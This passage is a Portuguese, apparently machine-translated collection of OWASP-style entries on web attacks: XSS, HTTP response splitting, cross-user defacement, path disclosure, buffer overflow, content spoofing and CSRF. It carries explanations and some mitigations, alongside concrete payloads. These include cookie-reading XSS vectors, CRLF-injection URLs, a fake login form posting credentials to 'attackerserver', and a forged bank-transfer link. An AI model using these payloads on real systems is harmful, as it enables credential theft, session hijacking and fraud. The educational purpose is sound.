+Ataques armazenados são aqueles onde o código injetado é permanentemente armazenado nos servidores de destino, como em um banco de dados, em um fórum de mensagens, registro de visitantes, campo de comentários, etc. A vítima, em seguida, recupera o script malicioso do servidor quando ele solicita o armazenados informação.
+
+Ataques XSS refletidos ~
+Ataques de reflexão são aqueles onde o código injetado é refletido para fora do servidor web, como em uma mensagem de erro, resultado de pesquisa, ou qualquer outra resposta que inclui alguns ou todos a entrada enviados para o servidor como parte do pedido. Ataques de reflexão são entregues às vítimas através de outra rota, como em uma mensagem de e-mail, ou em algum outro servidor web. Quando um usuário é levado a clicar em um link malicioso ou submeter um formulário especialmente criado, o código injetado viaja para o servidor web vulnerável, o que reflete o ataque de volta para o navegador do usuário. O navegador, em seguida, executa o código porque veio de um servidor "confiável".
+
+Consequências ataque XSS ~
+A conseqüência de um ataque XSS é o mesmo, independentemente de se ele é armazenado ou refletido (ou DOM Based). A diferença está na forma como a carga chega ao servidor. Não se iluda pensando que um "somente leitura" ou "brochureware" site não é vulnerável a sérios ataques XSS refletido. XSS pode causar uma variedade de problemas para o usuário final, que variam em gravidade de um aborrecimento para um compromisso relato completo. Os ataques XSS mais graves envolvem a divulgação de cookie de sessão do usuário, permitindo ao invasor sequestrar a sessão do usuário (hijacking) e assumir a conta. Outros ataques danosos incluem a divulgação de arquivos do usuário final, a instalação de cavalos de Tróia, redirecionar o usuário para outra página ou site, ou modificar a apresentação de conteúdo. Uma vulnerabilidade de XSS permite que um atacante possa modificar um comunicado de imprensa ou notícia, o que poderia afetar o preço das ações de uma empresa ou diminuir a confiança do consumidor. Uma vulnerabilidade XSS em um site farmacêutico poderia permitir que um invasor modificar informação sobre a dosagem, resultando em uma overdose.
+
+Como determinar se você está vulnerável ~
+Falhas de XSS podem ser difíceis de identificar e remover de um aplicativo web. A melhor maneira de encontrar falhas é realizar uma revisão do código e procurar por todos os lugares onde a entrada de um pedido HTTP poderia fazer o seu caminho para a saída HTML segurança. Note-se que uma variedade de diferentes etiquetas de HTML pode ser utilizada para transmitir um JavaScript nocivo. Nessus, Nikto, e algumas outras ferramentas disponíveis podem ajudar a digitalizar um site para essas falhas, mas só pode arranhar a superfície. Se uma parte de um site é vulnerável, existe uma alta probabilidade de que existem outros problemas também.
+
+Como se proteger ~
+Além disso, é fundamental que você desative o suporte a HTTP TRACE em todos os servidores web. Um atacante pode roubar dados de cookies via JavaScript mesmo quando o document.cookie está desabilitado ou não é suportado no cliente. Este ataque é montado quando um usuário posta um script malicioso para um fórum para quando outro usuário clica no link, um assíncrono rastreamento de chamada HTTP é acionado, que recolhe informações do cookie do usuário do servidor e, em seguida, envia-o para outro servidor malicioso que coleta as informações do cookie para que o atacante pode montar uma sessão de seqüestrar ataque. Isso é facilmente mitigado através da remoção de suporte para HTTP TRACE em todos os servidores web.
+
+
+Sintaxe XSS alternativa 
+
+
+XSS usando Script em Atributos ~
+Ataques XSS podem ser realizados sem o uso de <script> </ script> tags. Outras marcas vão fazer exatamente a mesma coisa, por exemplo:
+
+
+<body onload=alert('test1')>
+
+
+ou outros atributos como: onmouseover, onerror.
+
+onmouseover
+
+
+<b onmouseover=alert('Wufff!')>click me!</b>
+
+
+onerror
+
+
+<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
+
+
+XSS usando Script Via Esquemas de URL codificada ~
+Se precisar se esconder contra filtros de aplicações web que podem tentar codificar caracteres de corda, por exemplo: a = A (UTF-8) e usá-lo em IMG tag:
+
+
+<IMG SRC=j&#X41vascript:alert('test2')>
+
+
+Há muitos tipos diferentes de notações UTF-8 que nos dão mais possibilidades.
+
+
+XSS usando codificação de código ~
+Podemos codificar nosso script em base64 e colocá-lo na tag META. Desta forma, se livrar do alert () totalmente. Mais informações sobre este método podem ser encontrados no RFC 2397
+
+
+<META HTTP-EQUIV="refresh"
+CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
+
+
+Estes (um pouco modificado por mim) e outros exemplos podem ser encontrados em http://ha.ckers.org/xss.html, que é uma verdadeira enciclopédia do ataque XSS sintaxe alternativo.
+
+
+
+EXEMPLOS
+
+Ataques de cross-site scripting podem ocorrer em qualquer lugar que os usuários possivelmente mal-intencionados estão autorizados a publicar material regulamentada para um site confiável para o consumo de outros usuários válidos.
+O exemplo mais comum pode ser encontrado em sites de fóruns que fornecem funcionalidade list-style de discussão baseado na web.
+
+Exemplo 1 ~
+O seguinte segmento de código JSP lê uma identificação do funcionário, eid, a partir de uma solicitação HTTP a exibe para o usuário.
+
+
+<% String eid = request.getParameter("eid"); %> 
+	...
+	Employee ID: <%= eid %>
+
+
+O código neste exemplo funciona corretamente se o eid contém texto alfanumérico único padrão. Se o eid tem um valor que inclui meta-caracteres ou código-fonte, o código será executado pelo navegador da web, uma vez que exibe a resposta HTTP.
+Inicialmente, isso pode não parecer muito de uma vulnerabilidade. Afinal, por que alguém iria entrar um URL que faz com que o código malicioso seja executado no seu próprio computador? O perigo real é que um atacante irá criar a URL malicioso, então use e-mail ou truques de engenharia social para atrair as vítimas a visitar um link para o URL. Quando as vítimas clicarem no link, elas involuntariamente refletirão o conteúdo malicioso através da aplicação web vulnerável de volta para seus próprios computadores. Este mecanismo de exploração de aplicações web vulneráveis ​é conhecida como XSS refletido.
+
+Exemplo 2 ~
+O seguinte segmento de código JSP consulta um banco de dados para um empregado com um determinado ID e imprime o nome do funcionário correspondente.
+
+
+
+	<%... 
+	 Statement stmt = conn.createStatement();
+	 ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
+	 if (rs != null) {
+	  rs.next(); 
+	  String name = rs.getString("name");
+	%>
+	
+	Employee Name: <%= name %>
+
+
+Como no exemplo 1, as funções deste código corretamente quando os valores de nome são bem-comportado, mas ele não faz nada para evitar exploits se eles não são. Mais uma vez, este código pode parecer menos perigoso, porque o valor do nome é lido a partir de um banco de dados, cujo conteúdo é, aparentemente, gerenciado pelo aplicativo. No entanto, se o valor do nome se origina a partir de dados fornecidos pelo usuário, então o banco de dados pode ser um canal para conteúdo malicioso. Sem validação de entrada apropriada em todos os dados armazenados no banco de dados, um atacante pode executar comandos maliciosos no navegador do usuário. Este tipo de exploração, conhecido como XSS armazenados, é particularmente insidiosa porque a dissimulação causada pelo armazenamento de dados torna-se mais difícil a identificação da ameaça e aumenta a possibilidade de que o ataque vai afectar vários usuários. XSS tem o seu início nesta forma com sites que ofereciam um "livro de visitas" para os visitantes. Atacantes incluiria JavaScript em suas entradas no livro de visitas, e todos os visitantes posteriores à página guestbook iria executar o código malicioso.
+
+Como os exemplos mostram, vulnerabilidades XSS são causadas por um código que inclui dados em unvalidated uma resposta HTTP. Existem três vectores, através da qual um ataque XSS podem atingir uma vítima:
+
+* Como no Exemplo 1, os dados são lidos diretamente do pedido HTTP e refletida de volta na resposta HTTP. Exploits XSS refletidos ocorrem quando um atacante faz com que um usuário forneça conteúdo perigoso para uma aplicação web vulnerável, que é refletida de volta para o usuário e executado pelo navegador da web. O mecanismo mais comum para entrega de conteúdo malicioso é incluí-lo como um parâmetro em uma URL que é postado publicamente ou e-mail diretamente às vítimas. URLs construído desta forma constituem o núcleo de muitos esquemas de phishing, em que um atacante convence as vítimas a visitar uma URL que se refere a um site vulnerável. Depois que o site reflete o conteúdo de volta do atacante para o usuário, o conteúdo é executado e passa a transferir informações pessoais, tais como cookies que podem incluir informações de sessão, da máquina do usuário para o atacante ou realizar outras atividades nefastas.
+* Como no Exemplo 2, o aplicativo armazena dados perigosas em um banco de dados ou outro armazenamento de dados confiável. Os dados perigoso é posteriormente lidos de volta para o aplicativo e incluídos no conteúdo dinâmico. Exploits XSS Stored ocorrem quando um atacante injeta conteúdo perigoso em um armazenamento de dados que depois são lidos e incluídos no conteúdo dinâmico. Do ponto de vista de um atacante, o lugar ideal para injetar conteúdo malicioso está em uma área que é exibida para tanto muitos usuários ou usuários particularmente interessantes. Usuários interessantes normalmente têm privilégios elevados na aplicação ou interagir com dados sensíveis que é valioso para o atacante. Se um desses usuários executa conteúdo malicioso, o atacante pode ser capaz de executar operações privilegiadas em nome do usuário ou o acesso a dados sigilosos pertencentes ao usuário.
+* Uma fonte de fora do aplicativo armazena dados perigosas em um banco de dados ou outro armazenamento de dados, e os dados perigoso posteriormente é lido de volta para o aplicativo como dados confiáveis ​​e incluídos no conteúdo dinâmico.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Definir Manipulação
+
+Descrição
+
+Este ataque tem como objetivo modificar as configurações do aplicativo, a fim de fazer com que dados enganosos ou vantagens em nome do invasor. Ele pode manipular valores no sistema e gerenciar os recursos de usuários específicos da aplicação ou afetar suas funcionalidades.
+Um atacante pode explorar diversas funcionalidades do aplicativo usando esta técnica de ataque, mas que não seria possível descrever todas as formas de exploração, devido às inúmeras opções que o atacante pode usar para controlar os valores do sistema.
+Usando esta técnica de ataque, é possível manipular as configurações, alterando as funções do aplicativo, tais como chamadas para o banco de dados, bloqueando o acesso a bibliotecas externas e / ou modificação de arquivos de log.
+
+Exemplos
+
+Exemplo 1 ~
+Um atacante precisa identificar as variáveis​sem validação de entrada ou aqueles indevidamente encapsulado para obter sucesso no ataque.
+O exemplo que se segue baseou-se aqueles encontrados na definição de dicionário Pessoa CWE (Definição Manipulação-15).
+Considere o seguinte trecho de código Java:
+
+
+ …
+ conn.setCatalog(request.getParameter(“catalog”));
+ ...
+
+
+Este fragmento lê a string "catálogo" de "HttpServletRequest" e define-o como o catálogo de ativos para uma conexão de dados. Um invasor pode manipular essa informação e causar um erro de conexão ou acesso não autorizado a outros catálogos.
+
+Exemplo 2 - Bloquear o acesso a bibliotecas
+O atacante tem os privilégios para bloquear o acesso ao aplicativo para bibliotecas externas para executar este ataque. É necessário descobrir o que as bibliotecas externas são acessadas pelo aplicativo e bloqueá-las. O atacante precisa observar se o comportamento do sistema entra em um estado inseguro / inconsistente.
+Neste caso, o aplicativo usa uma biblioteca de criptografia gerando um terceiro número aleatório para gerar IDs de sessão do usuário. Um atacante pode bloquear o acesso a esta biblioteca por renomeá-la. Em seguida, o aplicativo usará a biblioteca de geração de números pseudo-aleatório fraco. O atacante pode usar essa fraqueza para prever o ID de usuário Session, ele / ela tenta executar elevação de escalonamento de privilégios e ganha acesso à conta do usuário.
+Para mais detalhes sobre este ataque, veja: http://capec.mitre.org/data/definitions/96.html
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Delimitador de Parâmetro
+
+Descrição
+
+Este ataque se baseia na manipulação de delimitadores de parâmetros utilizados por vetores de entrada de aplicações web, a fim de causar comportamentos inesperados, como controle de acesso e desvio de autorização e divulgação de informações, entre outros.
+
+Exemplos
+
+Para ilustrar essa vulnerabilidade, vamos usar uma vulnerabilidade encontrada no Poster V2, um sistema de postagem baseado em linguagem de programação PHP.
+Esta aplicação tem uma vulnerabilidade perigosa que permite a inserção de dados em campos de usuário (username, password, endereço de email e privilégios) no arquivo "mem.php", que é responsável por gerenciar o usuário do aplicativo.
+Um exemplo do arquivo "mem.php", onde o usuário Jose tem privilégios de administrador e acesso de usuário Alice:
+
+
+<?
+Jose|12345678|jose@attack.com|admin|
+Alice|87654321|alice@attack.com|normal|
+?>
+
+
+Quando um usuário quiser editar seu perfil, ele deve usar a opção "Editar conta" na página de "index.php" e digitar suas informações de login. No entanto, usando. "|" Como delimitador de parâmetro no campo de e-mail, seguido por "admin" , o usuário pode elevar seus privilégios de administrador Exemplo.:
+
+
+Username: Alice
+Password: 87654321
+Email: alice@attack.com |admin| 
+
+
+Essa informação vai ser salva no arquivo "mem.php" deste jeito:
+
+
+Alice|87654321|alice@attack.com|admin|normal|
+
+
+Nesse caso, o último delimitador de parâmetro considerado é "|admin|" e o usuário consegue elevar seus privilégios atribuídos pelo perfil de administrador.
+Embora esta vulnerabilidade não permite a manipulação de perfis de outros usuários, permite escalada de privilégios para usuários do aplicativo.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Desfiguração Cross-Usuário
+
+Descrição
+
+Um atacante pode fazer um único pedido para um servidor vulnerável que fará com que o servidor  crie duas respostas, o segundo dos quais pode ser interpretado como uma resposta a um pedido diferente, possivelmente, uma feita por outro usuário que compartilhar a mesma conexão TCP com o servidor . Isso pode ser feito, convencendo o usuário a enviar o pedido malicioso em si, ou remotamente em situações em que o atacante compartilhe com o usuário uma conexão TCP comum para o servidor, como um servidor proxy compartilhado. No melhor dos casos, um atacante pode aproveitar essa habilidade para convencer os usuários de que o pedido tenha sido hackeado, causando aos usuários a perda de confiança na segurança da aplicação. No pior dos casos, um atacante pode fornecer conteúdo especialmente criado projetado para e imitar o comportamento da aplicação, mas redirecionar informações pessoais, como números de contas e senhas, de volta para o atacante.
+Este ataque é bastante difícil de realizar no ambiente real. A lista de condições é longa e difícil de realizar pelo atacante.
+A Desfiguração Cross-Usuário é possível por causa da divisão de resposta HTTP e falhas na aplicação web. É crucial do ponto de vista do atacante que o aplicativo permita preencher o cabeçalho campo com mais de um cabeçalho usando CR (Carrige Return) e caracteres LF (Line Feed).
+
+Exemplos
+
+Nós encontramos uma página web, que recebe o nome do serviço a partir da "página" argumento e então redireciona (302) para este serviço.
+Exemplo: http://testsite.com/redir.php?page=http://other.testsite.com/
+E código exemplar da redir.php:
+
+
+rezos@spin ~/public_html $ cat redir.php
+<?php
+header ("Location: " . $_GET['page']);
+?>
+
+
+Elaborando solicitações apropriadas:
+
+
+
+/redir.php?page=http://other.testsite.com%0d%0aContent-
+Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-
+Type:%20text/html%0d%0aContent-
+Length:%2019%0d%0a%0d%0a<html>deface</html>
+
+
+Servidor HTTP irá responder com duas (não uma!) Seguindo os cabeçalhos:
+
+1
+
+HTTP/1.1 302 Moved Temporarily
+Date: Wed, 24 Dec 2003 15:26:41 GMT
+Location: http://testsite.com/redir.php?page=http://other.testsite.com
+Content-Length: 0
+
+2
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 19
+<html>deface</html>
+
+
+Se o usuário compartilha uma conexão TCP (por exemplo, cache de proxy) e irá enviar um pedido:
+/ index.html
+a resposta n º 2 será enviada a ele como uma resposta à sua solicitação.
+Desta forma, foi possível substituir a página web, que foi servida para o usuário especificado.
+
+Mais informação pode ser encontrada em uma das apresentações sob http://www.owasp.org/images/1/1a/OWASPAppSecEU2006_HTTPMessage
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Divisão de resposta HTTP
+
+Descrição
+
+A Divisão de resposta HTTP ocorre quando:
+* Dados entram em uma aplicação web através de uma fonte não confiável, mais freqüentemente uma solicitação HTTP.
+* Os dados são incluídos em um cabeçalho de resposta HTTP enviado para um usuário da web, sem ser validado para personagens maliciosos.
+Divisão de resposta HTTP é um meio para um fim, não um fim em si mesmo. Em sua raiz, o ataque é simples: um atacante passa dados maliciosos para uma aplicação vulnerável, e a aplicação inclui os dados em um cabeçalho de resposta HTTP.
+Para montar um exploit bem sucedido, o aplicativo deve permitir a entrada que contém CR (retorno de carro, também dado por% 0d ou \ r) e LF (avanço de linha, também dado por% 0a ou \ n) caracteres no cabeçalho. Esses personagens não só dão ataques de controle dos restantes cabeçalhos e corpo da resposta da aplicação pretende enviar, mas também permitir-lhes criar respostas adicionais totalmente sob seu controle.
+
+Exemplos
+
+O segmento de código a seguir lê o nome do autor de um weblog, o autor, a partir de uma solicitação HTTP ea coloca em um cabeçalho de cookie de uma resposta HTTP.
+
+
+String author = request.getParameter(AUTHOR_PARAM);
+	...
+	Cookie cookie = new Cookie("author", author);
+        cookie.setMaxAge(cookieExpiration);
+        response.addCookie(cookie);
+
+ 
+Supondo que uma string que consiste de caracteres alfanuméricos padrão, como "Jane Smith", é apresentada no pedido de resposta HTTP, incluindo o cookie pode ter a seguinte forma:
+
+
+HTTP/1.1 200 OK
+	...
+	Set-Cookie: author=Jane Smith
+	...
+
+
+No entanto, porque o valor do cookie é formado de uma entrada do usuário inválida, a resposta só vai manter esta forma, se o valor enviado para AUTHOR_PARAM não contém quaisquer caracteres CR e LF. Se um atacante envia uma seqüência de mal-intencionados, como "Wiley Hacker \ r \ nHTTP/1.1 200 OK \ r \ n ...", então a resposta HTTP seria dividido em duas respostas da seguinte forma:
+
+
+HTTP/1.1 200 OK
+	...
+	Set-Cookie: author=Wiley Hacker
+	
+	HTTP/1.1 200 OK
+	...
+
+
+Claramente, a segunda resposta é totalmente controlada pelo invasor e pode ser construída com qualquer cabeçalho e conteúdo do corpo desejada. A capacidade do atacante para a construção de respostas HTTP arbitrárias permite uma variedade de ataques resultantes, incluindo: Desfiguração Cross-Usuário, Envenenamento de Cache, Cross-site Scripting (XSS) e Sequestro de Página (HIJACKING).
+############################# FIM
+
+
+
+
+COMEÇO #############################
+@ Divulgação Completa de Caminho
+
+Descrição
+
+Vulnerabilidades completas da Divulgação Completa de Caminho (FPD) permitem ao atacante ver o caminho para o arquivo webroot / . por exemplo: / home / omg / htdocs / file /. Certas vulnerabilidades, como o uso do load_file () (dentro de um SQL Injection) consulta para ver o código fonte da página, exigem que o atacante tem o caminho completo para o arquivo que deseja ver.
+
+Exemplos
+
+Matriz Vazia ~
+Se temos um site que usa um método de solicitar de uma página como esta:
+
+
+http://site.com/index.php?page=about
+
+
+Podemos usar um método de abertura e fechamento de chaves que faz com que a página gere um erro. Este método ficaria assim:
+
+
+http://site.com/index.php?page[]=about
+
+
+Isso torna a página extinta a cuspir, portanto, fora um erro:
+
+
+Warning: opendir(Array): failed to open dir: No such file or directory in /home/omg/htdocs/index.php on line 84
+Warning: pg_num_rows(): supplied argument ... in /usr/home/example/html/pie/index.php on line 131
+
+
+Cookie de sessão nula ~
+Outro método popular e muito confiável de produzir erros contendo um FPD é dar a página de uma sessão anulada usando injeções JavaScript. A injeção simples usando este método seria algo parecido com isso:
+
+
+javascript:void(document.cookie="PHPSESSID=");
+
+
+Simplesmente definindo o cookie PHPSESSID para nada (null) obtemos um erro.
+
+
+Warning: session_start() [function.session-start]: The session id contains illegal characters, 
+valid characters are a-z, A-Z, 0-9 and '-,' in /home/example/public_html/includes/functions.php on line 2
+
+
+Essa vulnerabilidade é impedida simplesmente por um erro transformando e relatando off para que o seu código não cuspa erros.
+
+
+error_reporting(0);
+
+
+Erros podem conter informações úteis para o proprietário do site então ao invés de desativar o relatório de erros em tudo, é possível apenas esconder os erros de saída por display_errors (http://www.php.net/errorfunc.configuration # ini.display-errors) .
+
+Cookie de sessão inválida ~
+Como um complemento para o cookie de sessão nula, uma longa sessão também pode produzir um erro contendo DPF. Isso também pode ser feito usando uma injeção de JavaScript assim:
+
+
+javascript:void(document.cookie='PHPSESSID=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
+
+
+
+Simplesmente definindo o cookie PHPSESSID de 129 bytes ou mais, PHP pode cuspir um aviso.
+Outra abordagem seria a de definir os dados do cookie PHPSESSID a um dos bytes reservados.
+
+
+javascript:void(document.cookie='PHPSESSID=.');
+
+
+Ambas as variantes resultam no seguinte.
+
+
+
+
+Warning: session_start(): The session id is too long or contains illegal characters,
+valid characters are a-z, A-Z, 0-9 and '-,' in /home/example/public_html/includes/functions.php on line 2
+
+
+
+
+O mesmo remédio como para o cookie de sessão nula pode ser aplicado aqui. Erros podem ser escondidas da saída por display_errors (http://www.php.net/errorfunc.configuration # ini.display-errors).
+
+Acesso direto a arquivos que requer arquivos de biblioteca pré-carregados ~
+Desenvolvedores de aplicações Web, ás vezes, não conseguem adicionar verificações de segurança em arquivos que requer arquivos de biblioteca / função de pré-carregamento. Este é propenso a revelar possíveis informações confidenciais quando URLs dessas aplicações são diretamente solicitadas. Às vezes, é um indício de vulnerabilidade de Inclusão de arquivos locais (LFI).
+Quanto com Mambo CMS, se o acesso a uma URL direta, então fica 
+
+
+<br />
+<b>Fatal error</b>:  Class 'SpellChecker' not found in <b>/home/victim/public_html/mambo/mambots/editors/mostlyce/jscripts/tiny_mce/plugins/spellchecker/classes/PSpellShell.php</b> on line <b>9</b><br />
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Estouro de Recursos de Arquivos Binários
+
+Descrição
+
+A fonte de um excesso do buffer pode ser dados de entrada. Quando se trata do estouro de Recursos de Arquivos Binários, o atacante tem de modificar / preparar o arquivo binário de tal forma que a aplicação, depois de ler este arquivo, tornou-se propensa a um ataque clássico de estouro de buffer. A única diferença entre este e um ataque clássico é a fonte dos dados de entrada. Os exemplos mais comuns são especialmente arquivos MP3, JPEG ou ANI, que causam estouros de buffer trabalhados.
+
+Exemplos
+
+O aplicativo lê os 8 primeiros caracteres do arquivo binário.
+
+
+rezos@dojo-labs ~/owasp/binary $ cat read_binary_file.c
+#include <stdio.h>
+#include <string.h>
+
+int main(void)
+{
+       FILE *f;
+       char p[8];
+       char b[8];
+
+       f = fopen("file.bin", "r");
+       fread(b, sizeof(b), 1, f);
+       fclose(f);
+
+       strcpy(p, b);
+
+       printf("%s\n", p);
+
+       return 0;
+}
+
+
+
+O arquivo trabalhado contém mais de 8 caracteres.
+
+
+rezos@dojo-labs ~/owasp/binary $ cat file.bin
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+Depois de uma tentativa de correr mais uma vez, a aplicação vai acabar com:
+
+
+rezos@dojo-labs ~/owasp/binary $ ./read_binary_file
+Segmentation fault
+
+
+Fracasso. Seria um estouro de buffer?
+
+
+rezos@dojo-labs ~/owasp/binary $ gdb -q ./read_binary_file
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) r
+Starting program: /home/rezos/owasp/binary/read_binary_file
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e4b9e3 in strcpy () from /lib/libc.so.6
+
+
+Sim, isso foi um estouro de buffer em uma função strcpy ().
+Por quê?
+fread (b, sizeof (b), 1, f); - lê caracteres do fluxo f, sizeof (b) uma vez, para o buffer b. Parece OK. Entretanto, não há espaço para um '\ 0', que termina a string.
+Durante a execução strcpy (p, b), onde ambos os buffers são iguais, o transbordamento ocorre. A causa é a ausência do byte null / encerrar personagem em um buffer b []. O strcpy () função irá copiar para o buffer p [] tudo a partir de b [0] e terminando no byte nulo. O atacante realizou com sucesso o ataque de estouro de buffer por elaborar um arquivo especial.
+* Use funções equivalentes seguras, que verificam o tamanho do buffer, sempre que possível.
+
+A saber:
+
+* gets() -> fgets()
+* strcpy() -> strncpy()
+* strcat() -> strncat()
+* sprintf() -> snprintf()
+* Essas funções que não têm equivalentes seguros devem ser reescritas com verificações de segurança implementadas. Tempo gasto no que vai beneficiar no futuro. Lembre-se que você tem que fazê-lo apenas uma vez.
+* Use compiladores, que são capazes de identificar as funções inseguras, erros de lógica e verifique se a memória é substituída quando e onde ele não deveria estar.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Falsificação (Spoofing) de conteúdo
+
+Descrição
+
+Spoofing conteúdo, também conhecido como injeção de conteúdo ou desfiguração virtual, é um ataque visando um usuário tornada possível por uma vulnerabilidade de injeção em uma aplicação web. Quando um aplicativo não tratar adequadamente os dados do usuário fornecido, um atacante pode fornecer conteúdo a um aplicativo web, normalmente através de um valor de parâmetro, que é refletida de volta para o usuário. Este apresenta ao usuário uma página modificada no contexto do domínio confiável.
+Este ataque é normalmente usado como ou em conjunto com a engenharia social, porque o ataque é explorar uma vulnerabilidade baseada em código e confiança do usuário.
+
+Spoofing conteúdo vs Cross-site Scripting
+
+Spoofing conteúdo é um ataque que está intimamente relacionado com Cross-site Scripting (XSS). Enquanto XSS usa <script> e outras técnicas para executar JavaScript, conteúdo spoofing usa outras técnicas para modificar a página, por motivos maliciosos.
+Mesmo técnicas de mitigação de XSS são usados ​​dentro do aplicativo web, como a codificação de saída adequada, o aplicativo ainda pode ser vulnerável a ataques baseados em spoofing conteúdo do texto.
+
+
+Exemplos
+
+Hypertext Markup Language (HTML) Injeção
+Um cenário possível ataque é demonstrado abaixo. Para este cenário, deixa assume nenhuma codificação de saída está sendo implementado:
+1 - Atacante descobre vulnerabilidade de injeção e decide falsificar um formulário de login
+2 - Atacante artesanato link malicioso, incluindo o seu conteúdo HTML injetada, e envia para o usuário por e-mail
+3 - O usuário visita a página devido a página que está sendo localizado dentro de um domínio confiável
+4 - HTML injetada O atacante é processado e apresentado ao usuário solicitando um nome de usuário e senha
+5 - O usuário digita um nome de usuário e senha, que são ambos enviados para o servidor atacantes
+
+
+A página PHP simples que contém uma vulnerabilidade de injeção através do parâmetro name:
+
+
+<?php
+    $name = $_REQUEST ['name'];
+?>
+<html>
+	<h1>Welcome to the Internet!</h1>
+	<br>
+	<body>
+            Hello, <?php echo $name; ?>!
+	    <p>We are so glad you are here!</p>
+	</body>
+</html>
+
+A funcionalidade da página pode ser testado fazendo a seguinte pedido GET para a página:
+
+http://127.0.0.1/vulnerable.php?name=test
+
+Ao solicitar o link abaixo, a página torna o HTML injetada, apresenta um formulário de login, e comenta o resto da página após o ponto de injeção. Quando um usuário digita seu nome de usuário e senha, os valores são enviados para uma página chamada login.php no servidor do atacante via POST.
+
+http://127.0.0.1/vulnerable.php?name=<h3>Please Enter Your Username and Password to Proceed:</h3><form method="POST" 
+action="http://attackerserver/login.php">Username: <input type="text" name="username" /><br />Password: <input type="password" 
+name="password" /><br /><input type="submit" value="Login" /></form><!--
+
+Injeção de texto ~
+Outro exemplo de um ataque de spoofing conteúdo seria para apresentar informações falsas a um usuário via manipulação de texto. Um cenário de ataque é demonstrado abaixo. Para este cenário, vamos supor codificação de saída adequada foi implementado e XSS não é possível:
+1 - Um atacante identifica uma aplicação web que dá recomendações aos seus usuários sobre se deve comprar ou vender uma determinada ação
+2 - O atacante identifica um parâmetro vulnerável
+3 - O artesanato atacante um link malicioso por modificar ligeiramente um pedido válido
+4 - A ligação contendo o pedido modificado é enviado para um utilizador e que clica no link
+5 - A webpage válido é criada usando os atacantes recomendação malicioso e que o usuário acredita que a recomendação foi a partir do site estoque
+
+
+Página Válida ~
+http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=We+Recommend+You+Buy+Now
+Página Modificada ~
+http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=We+Really+Recommend+You+Sell+This+Stock+Now
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Falsificação de Pedido Cross-Site [CSFR - Cross-Site Forgery Request]
+
+Geral
+
+CSRF é um ataque que obriga o usuário final à executar ações indesejadas em uma aplicação web em que ele / ela está atualmente autenticado. Com um pouco de ajuda de engenharia social (como o envio de um link via email / chat), um atacante pode forçar os usuários de uma aplicação web para executar ações de escolher o atacante. Um exploit CSRF bem sucedido pode comprometer os dados do usuário final e operacional, no caso de usuário normal. Se o usuário final alvo é a conta de administrador, isso pode comprometer a aplicação web inteira.
+
+Descrição
+
+Cross-Site Request Forgery (CSRF) é um ataque que engana a vítima para o carregamento de uma página que contém um pedido malicioso. É mal-intencionado no sentido de que ele herda a identidade e os privilégios da vítima para executar uma função indesejada em nome da vítima, como a mudança de endereço da vítima e-mail, endereço residencial, ou senha, ou comprar algo. CSRF ataca geralmente funções alvo que provocam uma alteração de estado no servidor, mas também pode ser usado para aceder a dados confidenciais.
+Para a maioria dos sites, navegadores irão incluir automaticamente com essas solicitações quaisquer credenciais associadas ao site, como o cookie do usuário da sessão, as credenciais de autenticação básica, o endereço IP, as credenciais de domínio do Windows, etc. Portanto, se o usuário está autenticado no site, o site não terá nenhuma maneira de distinguir isso de uma solicitação do usuário legítimo.
+Desta forma, o atacante pode fazer a vítima executar ações que não pretendem, como logout de itens de compra, as informações da conta a mudança, recuperar informações da conta, ou qualquer outra função fornecida pelo site vulnerável.
+Às vezes, é possível armazenar o ataque CSRF no próprio local vulnerável. Tais vulnerabilidades são chamados de falhas de CSRF armazenados. Isso pode ser feito simplesmente ao armazenar uma tag IMG ou IFRAME em um campo que aceita HTML, ou por um ataque mais complexo cross-site scripting. Se o ataque pode armazenar um ataque CSRF no local, a severidade do ataque é amplificada. Em particular, a probabilidade é aumentada porque a vítima é mais provável para visualizar a página que contém o ataque de alguma página aleatória na Internet. A probabilidade também é aumentada porque a vítima é a certeza de ser autenticado no site já.
+Sinônimos: ataques CSRF também são conhecidos por vários outros nomes, incluindo XSRF, "Sea Surf", Andar Session, Cross-Site Falsificação de Referência, Hostile Vinculação. Microsoft refere-se a esse tipo de ataque como um ataque One-Click em seu processo de modelagem de ameaças e muitos lugares na sua documentação online.
+
+Exemplos
+
+Como funciona o ataque? ~
+Há inúmeras maneiras em que um usuário final pode ser enganado e carregar informações ou enviar informações de uma aplicação web. Para executar um ataque, devemos primeiro entender como gerar um pedido malicioso para a vítima para executar. Vamos considerar o seguinte exemplo: Alice deseja transferir US $ 100 para Bob usando bank.com. O pedido gerado por Alice será semelhante ao seguinte:
+
+
+POST http://bank.com/transfer.do HTTP/1.1
+...
+...
+...
+Content-Length: 19;
+
+acct=BOB&amount=100
+
+
+No entanto, Maria percebe que a mesma aplicação web irá executar a mesma transferência usando parâmetros de URL da seguinte forma:
+
+
+GET http://bank.com/transfer.do?acct=BOB&amount=100 HTTP/1.1
+
+
+Maria agora decide explorar esta vulnerabilidade de aplicações web utilizando Alice como sua vítima. Maria primeiro constrói o seguinte URL que vai transferir US $ 100.000 da conta de Alice para a conta:
+
+
+http://bank.com/transfer.do?acct=MARIA&amount=100000
+
+
+<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">Olhe minhas fotos!</a>
+
+
